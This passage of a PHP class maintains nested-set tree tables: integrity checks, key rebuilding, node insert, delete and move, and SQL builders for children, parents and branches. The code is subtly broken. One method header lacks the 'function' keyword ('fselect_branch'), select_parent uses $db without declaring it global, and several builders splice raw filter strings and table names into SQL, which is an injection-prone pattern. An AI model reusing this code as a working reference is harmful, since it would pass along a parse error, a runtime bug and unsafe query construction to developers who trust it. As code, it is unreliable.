        if ($row['min_left'] != 1)
          return 2;
        if ($row['max_right'] != $row['amount']*2)
          return 3;
      }
    if ($db->value('SELECT 1 FROM '.$table.' WHERE (right_key - left_key) % 2 = 0'))
      return 4;
    if ($db->value('SELECT 1 FROM '.$table.' WHERE (left_key - level + 2) % 2  = 1 '))
      return 5; 
      
    // too slow query :-(  
    //if ($db->value('SELECT t1.id, COUNT(t1.id) AS rep, MAX(t3.right_key) AS max_right FROM '.$table.' AS t1, '.$table.' AS t2, '.$table.' AS t3 WHERE t1.left_key <> t2.left_key AND t1.left_key <> t2.right_key AND t1.right_key <> t2.left_key AND t1.right_key <> t2.right_key GROUP BY t1.id HAVING max_right <> SQRT(4 * rep + 1) + 1'))
    //  return 6;
  
    return 0;
    
  }

  function internal_setup_nested_set($table, $key = null, $left = 0, $level = 0, $check_only = false) {
  
    global $db;

    $this->table($table);

    $tag = $table.'['.$key.']';
    
    if (isset($this->nested_set_keys[$tag])) {
      halt('Tree loop detected in '.$tag);
    }
    
    $this->nested_set_keys[$tag] = true;
    
    // the right value of this node is the left value + 1 
    $right = $left + 1; 

    $key_field          = $this->key_field($table);
    $nested_set_order   = $this->nested_set_order($table);
    if (!$nested_set_order)
      $nested_set_order = $this->name_field($table);
    $parent_field       = $this->parent_field($table);
     
    // get all children of this node 
    if (strlen($key))
      $sql = placeholder('SELECT '.$key_field.' FROM '.$table.' WHERE '.$parent_field.' = ? ORDER BY '.$nested_set_order, $key);
    else  
      $sql = 'SELECT '.$key_field.' FROM '.$table.' WHERE '.$parent_field.' IS NULL ORDER BY '.$nested_set_order;
    $query = $db->query($sql);
    while ($row = $db->next_row($query)) { 
      // recursive execution of this function for each 
      // child of this node 
      // $right is the current right value, which is 
      // incremented by the rebuild_tree function 
      $right = $this->internal_setup_nested_set($table, $row[$key_field], $right, $level + 1, $check_only); 
    } 

    if (!$check_only) {
      // we've got the left value, and now that we've processed
      // the children of this node we also know the right value
      $db->query("UPDATE ".$table." SET left_key = ?, right_key = ?, level = ? WHERE id = ?", $left, $right, $level, $key);
    }

    // return the right value of this node + 1 
    return $right + 1; 

  }

  function setup_nested_set($table, $key = null, $left = 0, $level = 0) {

    global $db;
    
    $this->nested_set_keys = array();
    
    $table = strtolower($table);

    $this->check_nested_set_struct($table);

    $db->start_transaction();
    
    set_time_limit(0);
    ignore_user_abort(true);

    $this->internal_setup_nested_set($table, $key, $left, $level);

    $db->commit_transaction();

  }

  function check_nested_set($table, $key = null, $left = 0, $level = 0) {

    global $db;
    
    $this->nested_set_keys = array();
    
    $table = strtolower($table);

    $this->check_nested_set_struct($table);

    $db->start_transaction();
    
    set_time_limit(0);
    ignore_user_abort(true);

    $this->internal_setup_nested_set($table, $key, $left, $level, true);

    $db->commit_transaction();

  }
  
  function nested_set_insert($table, $key, $values) {
    
    global $db;
    
    $table = strtolower($table);

    $parent_field = $this->parent_field($table);
    $key_field    = $this->key_field($table);
    
    if (!safe($values, $parent_field)) {
      $right_key = $db->value('SELECT IFNULL(MAX(right_key), 0) + 1 FROM '.$table.' WHERE right_key != -1');
      $level     = 0;
    } else {
      $parent    = $db->row('SELECT right_key, level FROM '.$table.' WHERE '.$key_field.' = ?', $values[$parent_field]);
      $right_key = $parent['right_key'];
      $level     = $parent['level'];
    }
    $db->query( 'UPDATE '.$table.' 
                    SET left_key = left_key + 2
                      , right_key = right_key + 2 
                  WHERE left_key > ?                    
                    AND right_key != -1 
                    AND id != ?'
              , $right_key
              , $key
              );
    $db->query( 'UPDATE '.$table.' 
                    SET right_key = right_key + 2                            
                  WHERE right_key >= ? 
                    AND left_key < ? 
                    AND right_key != -1 
                    AND id != ?'
              , $right_key
              , $right_key
              , $key
              );
    $db->query( 'UPDATE '.$table.' 
                    SET left_key = ?
                      , right_key = ?
                      , level = ?               
                  WHERE '.$key_field.' = ?'
              , $right_key
              , $right_key + 1
              , $level + 1
              , $key
              );

  }

  function nested_set_delete($table, $key, $values) {
    
    global $db;

    $table = strtolower($table);

    $left_key  = $values['left_key'];
    $right_key = $values['right_key'];
    
    $db->query( 'UPDATE '.$table.'
                    SET right_key = right_key - ?    
                  WHERE right_key > ? 
                    AND left_key  < ?
                    AND right_key != -1'
              , $right_key - $left_key + 1
              , $right_key
              , $left_key
              );
    $db->query(' UPDATE '.$table.' 
                    SET left_key  = left_key - ?
                      , right_key = right_key - ? 
                  WHERE left_key > ?
                    AND right_key != -1'
              , $right_key - $left_key + 1
              , $right_key - $left_key + 1
              , $right_key
              );

  }

  function nested_set_update($table, $key, $old_values, $new_values) {
    
    global $db;
    
    $table = strtolower($table);

    $parent_field = $this->parent_field($table);
    $key_field    = $this->key_field($table);
    
    $level     = $old_values['level'];
    $left_key  = $old_values['left_key'];
    $right_key = $old_values['right_key'];
    
    // removing from tree
    $db->query( 'UPDATE '.$table.' 
                    SET right_key = -1 
                  WHERE left_key >= ? 
                    AND right_key <= ?'
              , $left_key
              , $right_key
              );
    // process deletion
    $this->nested_set_delete($table, $key, $old_values);
    
    // emulate insert
    $query = $db->query('SELECT * FROM '.$table.' WHERE right_key = -1 ORDER BY level, left_key');
    while ($row = $db->next_row($query))
      $this->nested_set_insert($table, $row[$key_field], $row);

  }

  function select_tree($table, $joins = null, $except = array(), $filter = null) {
  
    $table = strtolower($table);

    if ($this->is_nested_set($table)) {
      $this->check_nested_set_struct($table);
      if (is_array($joins)) {
        $select = 'SELECT t1.*';
        $from   = 'FROM '.$table.' t1';
        $idx = 2;
        foreach ($joins as $join) {
          foreach ($join['select'] as $field     => $alias)  
            $select .= ', t'.$idx.'.'.$field.' as '.$alias;
          $from .= ' LEFT JOIN '.$join['from'].' t'.$idx.' ON ';
          $first = true;
          foreach ($join['where']  as $left_arg  => $right_arg) {  
            if (!$first)
              $from .= ' AND ';  
            $from .= 't'.$idx.'.'.$left_arg.' = ';
            if (is_numeric($right_arg) or preg_match('/^\'/', $right_arg))
              $from .= $right_arg; 
            else
              $from .= 't1.'.$right_arg; 
            $first = false;  
          }  
          $idx++; 
        }
        $sql = $select.' '.$from.' WHERE 1=1';
        if ($except)
          $sql .= placeholder(' AND (left_key < ? OR right_key > ?)', $except['left_key'], $except['right_key']);
        if ($filter)
          $sql .= ' AND '.$filter;
        $sql .= ' ORDER BY t1.left_key, t2.'.$this->name_field($table);
        return $sql;
      } else {
        $sql = 'SELECT * FROM '.$table.' WHERE 1=1';
        if ($except)
          $sql .= placeholder(' AND (left_key < ? OR right_key > ?)', $except['left_key'], $except['right_key']);
        if ($filter)
          $sql .= ' AND '.$filter;
        $sql .= ' ORDER BY left_key, '.$this->name_field($table);
        return $sql;
      }
    } else {
      halt('Tree selection is not supported for table "'.$table.'"');
    }
    
  }
  
  function query_tree($table) {
  
    global $db;

    $table = strtolower($table);

    return $db->query($this->select_tree($table));
    
  }

  function select_childs($table, $key, $level = null) {
  
    global $db;

    $table = strtolower($table);

    if ($this->is_nested_set($table)) {
      $this->check_nested_set_struct($table);
      if ($row = $db->row('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key)) 
        if ($level)
          return sql_placeholder( 'SELECT * FROM '.$table.' WHERE left_key > ? AND right_key < ? AND level > ? ORDER BY left_key'
                                , $row['left_key'], $row['right_key'], $level);
        else
          return sql_placeholder( 'SELECT * FROM '.$table.' WHERE left_key > ? AND right_key < ? ORDER BY left_key'
                                , $row['left_key'], $row['right_key']);
    } else {
      $parent_field = $this->parent_field($table);
      if ($level == 1)
        return sql_placeholder('SELECT * FROM '.$table.' WHERE '.$parent_field.' = ?', $key);
      else
        halt('Childs selection is not supported for table "'.$table.'"');
    }
    
  }
  
  function query_childs($table, $key, $level = 0) {
  
    global $db;

    $table = strtolower($table);

    return $db->query($this->select_childs($table, $key, $level));
    
  }

  function select_parents($table, $key, $level = 1) {
 
    global $db;

    $table = strtolower($table);

    if ($this->is_nested_set($table)) {
      $this->check_nested_set_struct($table);
      if ($row = $db->row('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key))
        if ($level)
          return sql_placeholder( 'SELECT * FROM '.$table.' WHERE left_key < ? AND right_key > ? AND level >= ? ORDER BY left_key'
                                , $row['left_key'], $row['right_key'], $row['level'] - $level);
        else
          return sql_placeholder( 'SELECT * FROM '.$table.' WHERE left_key < ? AND right_key > ? ORDER BY left_key'
                                , $row['left_key'], $row['right_key']);
    } else {
      $parent_field = $this->parent_field($table);
      if ($level == 1)
        return $this->select_parent($table, $key);
      else
        halt('Parents selection is not supported for table "'.$table.'"');
    }

  }

  function query_parents($table, $key, $level = 1) {
  
    global $db;

    $table = strtolower($table);

    return $db->query($this->select_parents($table, $key, $level));
    
  }

  fselect_branch($table, $key) {
 
    global $db;

    $table = strtolower($table);

    if ($this->is_nested_set($table)) {
      $this->check_nested_set_struct($table);
      if ($row = $db->row('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key))
        return sql_placeholder( 'SELECT * FROM '.$table.' WHERE left_key < ? AND right_key > ? ORDER BY left_key'
                              , $row['right_key'], $row['left_key']);
    } else {
      halt('Branch selection is not supported for table "'.$table.'"');
    }

  }

  function query_branch($table, $key) {
  
    global $db;

    $table = strtolower($table);

    return $db->query($this->select_branch($table, $key));
    
  }

  function select_parent($table, $key) {

    $table = strtolower($table);

    $parent_field = $this->parent_field($table);
    if ($row = $db->row('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key))
      return sql_placeholder('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $row[$this->key_field($table)]);

  }

  function query_parent($table, $key) {
  
    global $db;

    $table = strtolower($table);

    return $db->query($this->select_parent($table, $key));
    
  }
  
  function call_deferred_events() {
           
    foreach ($this->deferred_events as $event) {
      $method     = $event['method'];
      $event_name = $event['event'].'|'.$event['table'];
      $this->in_event[$event_name] = true;
      $method($event['table'], $event['old_values'], $event['new_values'], $event['key'], $event['event']);
      $this->in_event[$event_name] = false;  
    }
    $this->deferred_events = array();  

  }

}

?>
